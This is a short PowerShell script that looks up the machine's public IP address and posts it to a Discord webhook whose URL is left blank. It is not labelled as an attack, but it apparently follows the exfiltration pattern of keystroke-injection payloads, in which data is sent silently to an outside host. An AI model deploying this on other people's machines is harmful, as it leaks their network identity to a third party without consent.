# Function to retrieve the machine's IP address
function Get-IPAddress {
    $IPAddress = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
    return $IPAddress
}

# Discord webhook URL
$dc = ""

# Retrieve the IP address
$IPAddress = Get-IPAddress

# Create a JSON payload with the IP address
$Payload = @{
    "content" = "Machine IP Address: $IPAddress"
} | ConvertTo-Json

# Send the payload to the Discord webhook
Invoke-RestMethod -Uri $dc -Method POST -ContentType "application/json" -Body $Payload
